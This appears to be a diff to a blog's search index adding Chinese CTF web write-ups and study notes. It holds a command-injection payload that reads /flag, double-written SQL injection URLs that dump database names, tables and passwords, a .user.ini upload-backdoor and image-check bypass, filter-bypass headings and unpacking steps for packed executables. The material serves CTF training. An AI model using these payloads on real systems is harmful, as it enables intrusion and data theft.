@@ -312,19 +312,13 @@
 <h3 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xx&#39; union select 1,(select database()) #</span><br><span class="line">xx&#39; union select (select database()),2 or &#39;</span><br></pre></td></tr></table></figure>
 
 <h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br><span class="line">1&#39;;show tables from supersqli;#</span><br><span class="line">1&#39;;show columns from __;</span><br></pre></td></tr></table></figure>
-<h2 id="常见注入技巧："><a href="#常见注入技巧：" class="headerlink" title="常见注入技巧："></a>常见注入技巧：</h2><p>bypass</p>
-<p>mid切割字符串</p>
-<p>hex编码与字符串</p>
-<p>利用group_concat连接多行</p>
-<p>利用like和regexp来进行匹配</p>
-<p>mysql的GBK导致的宽字节注入</p>
-<p>mysql关于utf-8编码问题</p>
+<h2 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h2><h3 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h3><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><h3 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h3><h3 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h3><h3 id="过滤大小于号绕过"><a href="#过滤大小于号绕过" class="headerlink" title="过滤大小于号绕过"></a>过滤大小于号绕过</h3><h3 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h3><h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><h3 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h3><p>参考：<a href="https://blog.csdn.net/huanghelouzi/article/details/82995313" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82995313</a></p>
 ]]></content>
       <categories>
         <category>note</category>
       </categories>
       <tags>
-        <tag>CTF - web</tag>
+        <tag>CTF - Web</tag>
       </tags>
   </entry>
   <entry>
@@ -341,12 +335,68 @@
 <p><img src="/2020/07/28/week20200727-20200802/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200729003126637.png" alt="image-20200729003126637"></p>
 <p>连接，在根目录找到flag文件</p>
 <p>flag{41d79b55-d82a-4490-9bb4-31f8308a676a}</p>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2>]]></content>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>—— 转自<a href="https://www.cnblogs.com/20175211lyz/p/11455355.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11455355.html</a> ——</p>
+<blockquote>
+<p><strong>.user.ini 文件</strong><br>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（[$_SERVER[‘DOCUMENT_ROOT’]]所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。<br>两个新的 INI 指令，<em>user_ini.filename</em> 和 <em>user_ini.cache_ttl</em> 控制着用户 INI 文件的使用。<br><em>user_ini.filename</em> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 <em>.user.ini*。<br>*user_ini.cache_ttl</em> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
+</blockquote>
+<blockquote>
+<p><strong>绕过exif_imagetype()方法</strong><br>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_width 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_height 7</span></span><br></pre></td></tr></table></figure>
+
+<p>知识点：<br>1.利用.user.ini上传/隐藏后门<br>2.绕过exif_imagetype()</p>
+<p>———————————————————————————————</p>
+<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>没有过滤，管道符直接取flag</p>
+<p>payload: 127.0.0.1 | cat /flag</p>
+<p>flag{de9ab224-511d-4a33-9e1d-5c871c9518b1}</p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>知识点：双写绕过</p>
+<p>数据库 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23</span><br></pre></td></tr></table></figure>
+
+<p>数据表 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br></pre></td></tr></table></figure>
+<p>目标在 ‘b4bsql’</p>
+<p>列 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br></pre></td></tr></table></figure>
+<p>列名’id,username,password’</p>
+<p>字段 payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</span><br></pre></td></tr></table></figure>
+
+<p>flag{04a7a268-baf9-48a5-b7cb-2b8aeebae765}</p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2>]]></content>
       <categories>
         <category>BUUCTF</category>
       </categories>
       <tags>
         <tag>CTF - Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shell study</title>
+    <url>/2020/08/02/shell-study/</url>
+    <content><![CDATA[<h1 id="OEP入口查找和基本壳的识别"><a href="#OEP入口查找和基本壳的识别" class="headerlink" title="OEP入口查找和基本壳的识别"></a>OEP入口查找和基本壳的识别</h1><h2 id="入口点的查找："><a href="#入口点的查找：" class="headerlink" title="入口点的查找："></a>入口点的查找：</h2><p>VC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。</p>
+<p>VS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。</p>
+<p>易语言特点：可以从程序里找一些call的调用，这个方法可以区分和VC的区别，非独立编译比较容易识别，入口特征和模块特征都有krnln.fnr。</p>
+<h2 id="脱壳基本方法"><a href="#脱壳基本方法" class="headerlink" title="脱壳基本方法"></a>脱壳基本方法</h2><p>1.单步跟踪</p>
+<p>2.平衡堆栈</p>
+<p>​    OEP的第一条指令是<code>pushad</code>，作用一般是保存寄存器环境，将8各通用寄存器压入堆栈；单步执行程序，指令<code>pushad</code>执行，堆栈变化，此时在栈顶（ESP）设置硬件断点；<br>​    运行，程序在<code>popad</code>附近停止，表示已经处在壳代码末尾，继续单步到一个较大的<code>jmp</code>跳转，目标应该是原始OEP。<br>​    观察代码是否确是原始OEP，可以参照上文不同情况入口点特征做判断。</p>
+<p>步骤：</p>
+<p>1.查找原始OEP</p>
+<p>​    确定原始程序代码的位置</p>
+<p>2.dump内存到文件</p>
+<p>​    内存中被还原的代码和数据抓取下来，重新保存成一个文件</p>
+<p>3.修复文件</p>
+<p>​    修复IAT，对从内存中转储到本地的文件进行修复</p>
+<p>参考：</p>
+<p><a href="https://www.52pojie.cn/forum-68-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/forum-68-1.html</a></p>
+<p><a href="https://www.52pojie.cn/thread-234739-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-234739-1-1.html</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/34263050" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34263050</a></p>
+]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
       </tags>
   </entry>
 </search>
